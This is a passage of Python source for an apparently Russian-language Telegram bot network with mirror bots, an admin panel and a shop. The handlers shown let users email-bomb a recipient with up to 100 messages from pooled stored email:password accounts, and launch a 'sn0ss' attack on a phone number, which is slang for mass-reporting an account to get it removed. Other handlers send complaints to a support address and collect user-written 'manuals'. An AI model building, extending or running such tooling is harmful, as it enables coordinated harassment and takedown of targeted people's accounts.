            temp_data[uid]['body'] = text
            temp_data[uid]['state'] = 'email_count'
            bot_instance.send_message(uid, "🔢 Количество (1-100):", reply_markup=cancel_kb())
            return

        if state == 'email_count':
            try:
                cnt = int(text)
                if not 1 <= cnt <= 100:
                    raise ValueError
            except:
                bot_instance.send_message(uid, "❌ Введите число 1-100")
                return
            eid = temp_data[uid]['email_id']
            email_data = db.get_email(eid, uid)
            if not email_data:
                bot_instance.send_message(uid, "❌ Аккаунт недоступен")
                del temp_data[uid]
                return
            sender, pwd, typ, owner = email_data
            recipient = temp_data[uid]['recipient']
            subject = temp_data[uid]['subject']
            body = temp_data[uid]['body']
            del temp_data[uid]

            status_msg = bot_instance.send_message(uid, f"🔄 Отправка {cnt} писем...")
            threading.Thread(target=send_emails, args=(uid, sender, pwd, recipient, subject, body, cnt, status_msg.id, bot_instance), daemon=True).start()
            return

        # ---------- сн0сс ----------
        if state == 'sn0ss_phone':
            phone = text.strip()
            if not re.match(r'^\+?\d{10,15}$', phone):
                bot_instance.send_message(uid, "❌ Неверный номер")
                return
            del temp_data[uid]
            status_msg = bot_instance.send_message(uid, f"🔄 Запуск сн0сс для {phone}...")
            threading.Thread(target=sn0ss_attack, args=(uid, phone, status_msg.id, bot_instance), daemon=True).start()
            return

        # ---------- Жалоба на сайт ----------
        if state == 'complaint_text':
            if len(text) < 10:
                bot_instance.send_message(uid, "❌ Слишком коротко")
                return
            complaint = text
            del temp_data[uid]
            status_msg = bot_instance.send_message(uid, "🔄 Отправка жалобы на support...")
            threading.Thread(target=send_complaint, args=(uid, complaint, status_msg.id, bot_instance), daemon=True).start()
            return

        # ---------- Мануалы ----------
        if state == 'manual_title':
            if len(text) < 3:
                bot_instance.send_message(uid, "❌ Слишком короткое название")
                return
            temp_data[uid]['title'] = text
            temp_data[uid]['state'] = 'manual_category'
            bot_instance.send_message(uid, "📁 Введите категорию:", reply_markup=cancel_kb())
            return

        if state == 'manual_category':
            temp_data[uid]['category'] = text
            temp_data[uid]['state'] = 'manual_content'
            bot_instance.send_message(uid, "📝 Введите текст мануала:", reply_markup=cancel_kb())
            return

        if state == 'manual_content':
            title = temp_data[uid]['title']
            cat = temp_data[uid]['category']
            content = text
            username = message.from_user.username or f"user_{uid}"
            mid = db.create_manual(title, content, cat, uid, username)
            try:
                main_bot.send_message(ADMIN_ID, f"📚 Новый мануал '{title}' от @{username}", 
                                     reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("📋 Проверить", callback_data=f"admin_manual_view_{mid}")))
            except:
                pass
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Мануал отправлен на модерацию", reply_markup=main_kb())
            return

        # ---------- Зеркала ----------
        if state == 'mirror_token':
            token = text.strip()
            try:
                test_bot = telebot.TeleBot(token)
                me = test_bot.get_me()
                bot_username = me.username
                if db.add_mirror(token, bot_username, uid, uid):
                    bot_info = {"bot": test_bot, "token": token, "is_main": False, "thread": None, "owner_id": uid}
                    bots.append(bot_info)
                    register_handlers(test_bot, is_main=False, mirror_token=token)
                    start_bot_thread(bot_info)
                    bot_instance.send_message(uid, f"✅ Зеркало @{bot_username} успешно создано и запущено!")
                else:
                    bot_instance.send_message(uid, "❌ Такое зеркало уже существует")
            except Exception as e:
                bot_instance.send_message(uid, f"❌ Ошибка: {e}")
            del temp_data[uid]
            return

        if state == 'mirror_set_welcome':
            token = temp_data[uid]['mirror_token']
            db.update_mirror_settings(token, welcome_text=text)
            bot_instance.send_message(uid, "✅ Приветствие обновлено")
            del temp_data[uid]
            show_mirror_panel(uid, None, token, bot_instance)
            return

        if state == 'mirror_set_channel':
            token = temp_data[uid]['mirror_token']
            if text == "0":
                db.update_mirror_settings(token, required_channel=None, channel_link=None)
                bot_instance.send_message(uid, "✅ Подписка отключена")
            else:
                if text.startswith('@'):
                    channel = text
                    db.update_mirror_settings(token, required_channel=channel, channel_link=f"https://t.me/{channel[1:]}")
                    bot_instance.send_message(uid, f"✅ Канал подписки установлен: {channel}")
                else:
                    bot_instance.send_message(uid, "❌ Введите username канала, начиная с @")
                    return
            del temp_data[uid]
            show_mirror_panel(uid, None, token, bot_instance)
            return

        if state == 'mirror_set_interval':
            token = temp_data[uid]['mirror_token']
            try:
                interval = int(text)
                if interval < 0:
                    raise ValueError
                db.update_mirror_settings(token, broadcast_interval=interval)
                bot_instance.send_message(uid, f"✅ Интервал рассылки установлен: {interval} дн.")
            except:
                bot_instance.send_message(uid, "❌ Введите целое число (0 для отключения)")
                return
            del temp_data[uid]
            show_mirror_panel(uid, None, token, bot_instance)
            return

        if state == 'mirror_broadcast':
            token = temp_data[uid]['mirror_token']
            status_msg = bot_instance.send_message(uid, "🔄 Запуск рассылки...")
            threading.Thread(target=broadcast_thread_mirror, args=(uid, token, text, status_msg.id), daemon=True).start()
            del temp_data[uid]
            return

        # ---------- Админские состояния ----------
        if state == 'admin_ticket_reply' and uid == ADMIN_ID:
            tid = temp_data[uid]['ticket_id']
            db.add_ticket_msg(tid, ADMIN_ID, text, is_admin=1)
            with sqlite3.connect(DB_PATH) as conn:
                r = conn.execute('SELECT user_id FROM tickets WHERE ticket_id=?', (tid,)).fetchone()
            if r:
                user_id = r[0]
                user_bot_token = db.get_user(user_id)[5] if db.get_user(user_id) else None
                user_bot = get_bot_by_token(user_bot_token) if user_bot_token else main_bot
                try:
                    user_bot.send_message(user_id, f"💬 Ответ по тикету {tid}:\n{text}", 
                                         reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("📝 Ответить", callback_data=f"ticket_reply_{tid}")))
                except:
                    pass
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Ответ отправлен")
            return

        if state == 'admin_manual_reject' and uid == ADMIN_ID:
            mid = temp_data[uid]['manual_id']
            db.update_manual_status(mid, 'rejected', text, uid)
            with sqlite3.connect(DB_PATH) as conn:
                r = conn.execute('SELECT author_id, title FROM manuals WHERE id=?', (mid,)).fetchone()
            if r:
                author, title = r
                user_bot_token = db.get_user(author)[5] if db.get_user(author) else None
                user_bot = get_bot_by_token(user_bot_token) if user_bot_token else main_bot
                try:
                    user_bot.send_message(author, f"❌ Мануал '{title}' отклонён.\nПричина: {text}")
                except:
                    pass
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Отклонено")
            return

        if state == 'admin_manual_revision' and uid == ADMIN_ID:
            mid = temp_data[uid]['manual_id']
            db.update_manual_status(mid, 'revision', text, uid)
            with sqlite3.connect(DB_PATH) as conn:
                r = conn.execute('SELECT author_id, title FROM manuals WHERE id=?', (mid,)).fetchone()
            if r:
                author, title = r
                user_bot_token = db.get_user(author)[5] if db.get_user(author) else None
                user_bot = get_bot_by_token(user_bot_token) if user_bot_token else main_bot
                try:
                    user_bot.send_message(author, f"✏️ Мануал '{title}' отправлен на доработку.\nЗамечания: {text}")
                except:
                    pass
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Отправлено на доработку")
            return

        if state == 'admin_add_email_public' and uid == ADMIN_ID:
            parts = text.split(':', 1)
            if len(parts) != 2:
                bot_instance.send_message(uid, "❌ Формат email:пароль")
                return
            email, pwd = parts
            if db.add_email(email, pwd, uid, 'public'):
                bot_instance.send_message(uid, "✅ Публичная почта добавлена")
            else:
                bot_instance.send_message(uid, "❌ Уже существует")
            del temp_data[uid]
            return

        if state == 'admin_add_email_personal' and uid == ADMIN_ID:
            parts = text.split(':', 2)
            if len(parts) != 3:
                bot_instance.send_message(uid, "❌ Формат email:пароль:user_id")
                return
            email, pwd, owner = parts
            try:
                owner = int(owner)
            except:
                bot_instance.send_message(uid, "❌ Неверный user_id")
                return
            if db.add_email(email, pwd, uid, 'personal', owner):
                bot_instance.send_message(uid, f"✅ Личная почта для {owner} добавлена")
            else:
                bot_instance.send_message(uid, "❌ Уже существует")
            del temp_data[uid]
            return

        if state == 'admin_broadcast_all' and uid == ADMIN_ID:
            # Запуск рассылки по всем зеркалам
            status_msg = bot_instance.send_message(uid, "🔄 Запуск рассылки по всем зеркалам...")
            success, failed, results = broadcast_to_all_mirrors(text, exclude=[ADMIN_ID])
            report = f"📢 Рассылка по всем зеркалам завершена!\n✅ Всего успешно: {success}\n❌ Всего ошибок: {failed}\n\n"
            report += "\n".join(results)
            try:
                bot_instance.edit_message_text(report, uid, status_msg.id)
            except:
                bot_instance.send_message(uid, report)
            del temp_data[uid]
            return

        if state == 'admin_broadcast_specific' and uid == ADMIN_ID:
            token = temp_data[uid]['mirror_token']
            success, failed = broadcast_to_specific_mirror(token, text, exclude=[ADMIN_ID])
            bot_instance.send_message(uid, f"📢 Рассылка в зеркало {token[:10]} завершена!\n✅ Успешно: {success}\n❌ Неудачно: {failed}")
            del temp_data[uid]
            return

        if state == 'admin_manual_title' and uid == ADMIN_ID:
            temp_data[uid]['title'] = text
            temp_data[uid]['state'] = 'admin_manual_category'
            bot_instance.send_message(uid, "📁 Введите категорию:", reply_markup=cancel_kb())
            return

        if state == 'admin_manual_category' and uid == ADMIN_ID:
            temp_data[uid]['category'] = text
            temp_data[uid]['state'] = 'admin_manual_content'
            bot_instance.send_message(uid, "📝 Введите текст:", reply_markup=cancel_kb())
            return

        if state == 'admin_manual_content' and uid == ADMIN_ID:
            title = temp_data[uid]['title']
            cat = temp_data[uid]['category']
            content = text
            mid = db.create_manual(title, content, cat, ADMIN_ID, "admin")
            db.update_manual_status(mid, 'approved', admin_id=ADMIN_ID)
            del temp_data[uid]
            bot_instance.send_message(uid, "✅ Мануал создан и опубликован")
            return

        if state == 'admin_edit_welcome' and uid == ADMIN_ID:
            custom_texts["welcome"] = text
            save_custom_texts(custom_texts)
            bot_instance.send_message(uid, "✅ Приветствие обновлено!", reply_markup=admin_kb())
            del temp_data[uid]
            return

        if state == 'admin_edit_button' and uid == ADMIN_ID:
            btn_key = temp_data[uid]['button_key']
            custom_texts[btn_key] = text
            save_custom_texts(custom_texts)
            bot_instance.send_message(uid, f"✅ Текст кнопки обновлён!", reply_markup=admin_kb())
            del temp_data[uid]
            return

        if state == 'admin_edit_email_instruction' and uid == ADMIN_ID:
            custom_texts["email_instruction"] = text
            save_custom_texts(custom_texts)
            bot_instance.send_message(uid, "✅ Инструкция обновлена!", reply_markup=admin_kb())
            del temp_data[uid]
            return

        if state == 'admin_edit_shop' and uid == ADMIN_ID:
            custom_texts["shop_text"] = text
            save_custom_texts(custom_texts)
            bot_instance.send_message(uid, "✅ Текст магазина обновлён!", reply_markup=admin_kb())
            del temp_data[uid]
            return

# ========== АДМИНСКИЕ КОЛБЭКИ ==========
def handle_admin_callback(bot_instance, call):
    uid = call.from_user.id
    data = call.data
    safe_answer_callback(bot_instance, call.id)

    if data == "admin_tickets":
        tickets = db.open_tickets()
        if not tickets:
            safe_edit_message(bot_instance, "Нет открытых тикетов", uid, call.message.id, reply_markup=admin_kb())
            return
        text = "📋 Открытые тикеты:\n"
        kb = InlineKeyboardMarkup(row_width=1)
        for tid, user_id, username, subj, created in tickets:
            text += f"\n{tid} - {subj[:30]} (@{username})"
            kb.add(InlineKeyboardButton(f"{tid} - {subj[:20]}", callback_data=f"admin_ticket_view_{tid}"))
        kb.add(InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"))
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_ticket_view_"):
        tid = data[18:]
        msgs = db.ticket_msgs(tid)
        with sqlite3.connect(DB_PATH) as conn:
            r = conn.execute('SELECT user_id, username, subject FROM tickets WHERE ticket_id=?', (tid,)).fetchone()
        if not r:
            safe_edit_message(bot_instance, "Тикет не найден", uid, call.message.id)
            return
        user_id, username, subj = r
        text = f"💬 Тикет {tid} от @{username}\nТема: {subj}\n\n"
        for msg, is_admin, created in msgs:
            sender = "👤 Пользователь" if not is_admin else "👑 Админ"
            text += f"<b>{sender} [{created[11:16]}]</b>\n{msg}\n\n"
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("✏️ Ответить", callback_data=f"admin_ticket_reply_{tid}"),
            InlineKeyboardButton("🔒 Закрыть", callback_data=f"admin_ticket_close_{tid}"),
            InlineKeyboardButton("🔙 Назад", callback_data="admin_tickets")
        )
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_ticket_reply_"):
        tid = data[20:]
        temp_data[uid] = {'state': 'admin_ticket_reply', 'ticket_id': tid}
        safe_edit_message(bot_instance, "Введите ответ:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data.startswith("admin_ticket_close_"):
        tid = data[19:]
        db.close_ticket(tid)
        safe_answer_callback(bot_instance, call.id, "Тикет закрыт")
        safe_edit_message(bot_instance, "Тикет закрыт.", uid, call.message.id, reply_markup=admin_kb())
        return

    if data == "admin_email_menu":
        safe_edit_message(bot_instance, "📧 Управление почтами", uid, call.message.id, reply_markup=admin_email_menu_kb())
        return

    if data == "admin_add_email_public":
        temp_data[uid] = {'state': 'admin_add_email_public'}
        safe_edit_message(bot_instance, "Отправьте email:пароль", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_add_email_personal":
        temp_data[uid] = {'state': 'admin_add_email_personal'}
        safe_edit_message(bot_instance, "Отправьте email:пароль:user_id", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_list_emails":
        emails = db.all_emails_admin()
        text = "📋 Все почты:\n"
        for eid, email, typ, owner, added, active, use in emails:
            status = "✅" if active else "❌"
            owner_str = f" (владелец {owner})" if owner else ""
            text += f"\n{status} {email} [{typ}]{owner_str} - использований {use}"
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=admin_email_menu_kb())
        return

    if data == "admin_manual_menu":
        safe_edit_message(bot_instance, "📚 Управление мануалами", uid, call.message.id, reply_markup=admin_manual_menu_kb())
        return

    if data == "admin_manual_pending":
        manuals = db.pending_manuals()
        if not manuals:
            safe_edit_message(bot_instance, "Нет мануалов на модерации", uid, call.message.id, reply_markup=admin_manual_menu_kb())
            return
        text = "📋 На модерации:\n"
        kb = InlineKeyboardMarkup(row_width=1)
        for mid, title, cat, author_id, author_name, created in manuals:
            text += f"\n{title} (@{author_name})"
            kb.add(InlineKeyboardButton(title[:20], callback_data=f"admin_manual_view_{mid}"))
        kb.add(InlineKeyboardButton("🔙 Назад", callback_data="admin_manual_menu"))
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_manual_view_"):
        mid = int(data[18:])
        m = db.get_manual(mid)
        if not m:
            safe_edit_message(bot_instance, "Мануал не найден", uid, call.message.id)
            return
        id, title, content, cat, author_id, author_username, status, views, likes, created, updated, published = m
        text = f"📖 {title}\nКатегория: {cat}\nАвтор: @{author_username}\n\n{content}"
        kb = InlineKeyboardMarkup(row_width=3)
        kb.add(
            InlineKeyboardButton("✅ Одобрить", callback_data=f"admin_manual_approve_{mid}"),
            InlineKeyboardButton("❌ Отклонить", callback_data=f"admin_manual_reject_{mid}"),
            InlineKeyboardButton("✏️ На доработку", callback_data=f"admin_manual_revision_{mid}"),
            InlineKeyboardButton("🔙 Назад", callback_data="admin_manual_pending")
        )
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_manual_approve_"):
        mid = int(data[21:])
        db.update_manual_status(mid, 'approved', admin_id=uid)
        safe_answer_callback(bot_instance, call.id, "Одобрено")
        with sqlite3.connect(DB_PATH) as conn:
            r = conn.execute('SELECT author_id, title FROM manuals WHERE id=?', (mid,)).fetchone()
        if r:
            author, title = r
            user_bot_token = db.get_user(author)[5] if db.get_user(author) else None
            user_bot = get_bot_by_token(user_bot_token) if user_bot_token else main_bot
            try:
                user_bot.send_message(author, f"✅ Мануал '{title}' одобрен и опубликован!")
            except:
                pass
        call.data = "admin_manual_pending"
        handle_admin_callback(bot_instance, call)
        return

    if data.startswith("admin_manual_reject_"):
        mid = int(data[20:])
        temp_data[uid] = {'state': 'admin_manual_reject', 'manual_id': mid}
        safe_edit_message(bot_instance, "Введите причину отклонения:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data.startswith("admin_manual_revision_"):
        mid = int(data[22:])
        temp_data[uid] = {'state': 'admin_manual_revision', 'manual_id': mid}
        safe_edit_message(bot_instance, "Что нужно исправить?", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_add_manual":
        temp_data[uid] = {'state': 'admin_manual_title'}
        safe_edit_message(bot_instance, "Введите название:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_stats":
        s = db.admin_stats()
        text = f"📊 Статистика\nПользователей: {s['users']}\nПочт: {s['emails']}\nОтправок: {s['total_sends']}\nТикетов: {s['open_tickets']}\nМануалов на модерации: {s['pending_manuals']}\nАктивных зеркал: {s['active_mirrors']}"
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=admin_kb())
        return

    if data == "admin_broadcast_menu":
        safe_edit_message(bot_instance, "📢 Выберите тип рассылки:", uid, call.message.id, reply_markup=admin_broadcast_menu_kb())
        return

    if data == "admin_broadcast_all":
        temp_data[uid] = {'state': 'admin_broadcast_all'}
        safe_edit_message(bot_instance, "Введите текст рассылки (будет отправлено во все зеркала):", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_broadcast_choose":
        mirrors = db.all_mirrors(active_only=True)
        if not mirrors:
            safe_edit_message(bot_instance, "Нет активных зеркал", uid, call.message.id, reply_markup=admin_broadcast_menu_kb())
            return
        total_pages = (len(mirrors) + 4) // 5
        page = 1
        kb = mirror_list_pagination_kb(mirrors, page, total_pages)
        safe_edit_message(bot_instance, "Выберите зеркало для рассылки:", uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_broadcast_page_"):
        page = int(data[21:])
        mirrors = db.all_mirrors(active_only=True)
        total_pages = (len(mirrors) + 4) // 5
        kb = mirror_list_pagination_kb(mirrors, page, total_pages)
        safe_edit_message(bot_instance, "Выберите зеркало для рассылки:", uid, call.message.id, reply_markup=kb)
        return

    if data.startswith("admin_broadcast_mirror_"):
        token = data[23:]
        temp_data[uid] = {'state': 'admin_broadcast_specific', 'mirror_token': token}
        safe_edit_message(bot_instance, "Введите текст рассылки для этого зеркала:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_settings":
        safe_edit_message(bot_instance, "⚙️ Настройки", uid, call.message.id, reply_markup=admin_settings_kb())
        return

    if data == "admin_edit_welcome":
        temp_data[uid] = {'state': 'admin_edit_welcome'}
        safe_edit_message(bot_instance, "Введите новый текст приветствия:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_edit_buttons":
        safe_edit_message(bot_instance, "Выберите кнопку для изменения:", uid, call.message.id, reply_markup=admin_edit_buttons_kb())
        return

    if data == "admin_edit_email_instruction":
        temp_data[uid] = {'state': 'admin_edit_email_instruction'}
        safe_edit_message(bot_instance, "Введите новый текст инструкции по почтам:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_edit_shop":
        temp_data[uid] = {'state': 'admin_edit_shop'}
        safe_edit_message(bot_instance, "Введите новый текст для магазина (используйте {support} для подстановки @nymps):", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data.startswith("admin_edit_btn_"):
        btn_map = {
            "emails": "button_emails",
            "manuals": "button_manuals",
            "sn0ss": "button_sn0ss",
            "site": "button_site",
            "shop": "button_shop",
            "mirrors": "button_mirrors",
            "profile": "button_profile",
            "support": "button_support"
        }
        key = data.replace("admin_edit_btn_", "")
        btn_key = btn_map.get(key)
        if btn_key:
            temp_data[uid] = {'state': 'admin_edit_button', 'button_key': btn_key}
            safe_edit_message(bot_instance, f"Введите новый текст для кнопки:\n\nТекущий: {custom_texts[btn_key]}", uid, call.message.id, reply_markup=cancel_kb())
        else:
            safe_answer_callback(bot_instance, call.id, "Неизвестная кнопка")
        return

    if data == "admin_mirror_menu":
        safe_edit_message(bot_instance, "🪞 Управление зеркалами", uid, call.message.id, reply_markup=admin_mirror_menu_kb())
        return

    if data == "admin_mirror_add":
        temp_data[uid] = {'state': 'mirror_token'}  # используем то же состояние, что и у пользователя
        safe_edit_message(bot_instance, "Отправьте токен нового бота:", uid, call.message.id, reply_markup=cancel_kb())
        return

    if data == "admin_mirror_list":
        mirrors = db.all_mirrors(active_only=False)
        if not mirrors:
            safe_edit_message(bot_instance, "Зеркал нет", uid, call.message.id, reply_markup=admin_mirror_menu_kb())
            return
        text = "📋 Все зеркала:\n"
        kb = InlineKeyboardMarkup(row_width=1)
        for m in mirrors:
            mid, token, username, owner, added_by, added, last, active, status, users, req_chan, link, welcome, interval, last_br, settings = m
            status_icon = "✅" if active else "❌"
            text += f"\n{status_icon} @{username or 'бот'} (владелец {owner})"
            kb.add(InlineKeyboardButton(f"{status_icon} {username or token[:10]}", callback_data=f"admin_mirror_del_{mid}"))
        kb.add(InlineKeyboardButton("🔙 Назад", callback_data="admin_mirror_menu"))
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=kb)
        return

    if data == "admin_mirror_check":
        text = "🔄 Проверка статуса зеркал:\n\n"
        for b in bots:
            try:
                me = b['bot'].get_me()
                text += f"✅ @{me.username}\n"
            except:
                text += f"❌ {b['token'][:10]}...\n"
        safe_edit_message(bot_instance, text, uid, call.message.id, reply_markup=admin_mirror_menu_kb())
        return

    if data.startswith("admin_mirror_del_"):
        mid = int(data[17:])
        db.deactivate_mirror(mid)
        mirror = db.get_mirror_by_id(mid)
        if mirror:
            token = mirror[1]
            for i, b in enumerate(bots):
                if b['token'] == token:
                    bots.pop(i)
                    break
        safe_answer_callback(bot_instance, call.id, "Зеркало удалено")
        call.data = "admin_mirror_list"
        handle_admin_callback(bot_instance, call)
        return

# ========== ЗАПУСК БОТОВ ==========
def start_bot_thread(bot_info):
    def run():
        try:
            bot_info['bot'].infinity_polling(timeout=30, long_polling_timeout=15)
        except Exception as e:
            logger.error(f"❌ Бот {bot_info['token'][:10]} остановился: {e}")
            bot_info['thread'] = None
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    bot_info['thread'] = thread
    return thread

# Инициализация основного бота
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode='HTML')
bots.append({"bot": main_bot, "token": MAIN_BOT_TOKEN, "is_main": True, "thread": None, "owner_id": ADMIN_ID})
register_handlers(main_bot, is_main=True)
start_bot_thread(bots[0])

# Загрузка зеркал из БД
mirrors_from_db = db.all_mirrors(active_only=True)
for mirror in mirrors_from_db:
    mid, token, username, owner, added_by, added, last, active, status, users, req_chan, link, welcome, interval, last_br, settings = mirror
    if active:
        try:
            bot = telebot.TeleBot(token, parse_mode='HTML')
            bot_info = {"bot": bot, "token": token, "is_main": False, "thread": None, "owner_id": owner}
            bots.append(bot_info)
            register_handlers(bot, is_main=False, mirror_token=token)
            start_bot_thread(bot_info)
            logger.info(f"✅ Зеркало загружено: {token[:10]}... (владелец {owner})")
        except Exception as e:
            logger.error(f"❌ Ошибка зеркала {token[:10]}: {e}")

# ========== МОНИТОРИНГ ЗЕРКАЛ ==========
def check_and_restart_mirrors():
    while True:
        time.sleep(5)
        for i, bot_info in enumerate(bots):
            if bot_info['is_main']:
                continue
            if bot_info['thread'] is None or not bot_info['thread'].is_alive():
                logger.warning(f"⚠️ Зеркало {bot_info['token'][:10]} упало, перезапуск...")
                try:
                    new_bot = telebot.TeleBot(bot_info['token'], parse_mode='HTML')
                    register_handlers(new_bot, is_main=False, mirror_token=bot_info['token'])
                    bot_info['bot'] = new_bot
                    start_bot_thread(bot_info)
                    logger.info(f"✅ Зеркало {bot_info['token'][:10]} перезапущено")
                except Exception as e:
                    logger.error(f"❌ Не удалось перезапустить зеркало {bot_info['token'][:10]}: {e}")

mirror_monitor_thread = threading.Thread(target=check_and_restart_mirrors, daemon=True)
mirror_monitor_thread.start()

# ========== ВРЕМЕННОЕ ХРАНИЛИЩЕ ==========
temp_data = {}

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("="*60)
    print(f"🚀 {BOT_NAME} - ЗАПУСК {len(bots)} БОТОВ")
    print("="*60)
    print(f"📁 Папка с данными: {DATA_DIR}")
    print(f"📁 Логи: {LOGS_DIR}")
    print(f"📁 Зеркала: {MIRRORS_DIR}")
    print(f"🗄️ База данных: {DB_PATH}")
    print("="*60)
    print("✅ Все боты запущены. Мониторинг зеркал активен.")
    print("="*60)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n❌ Остановка")
        sys.exit(0)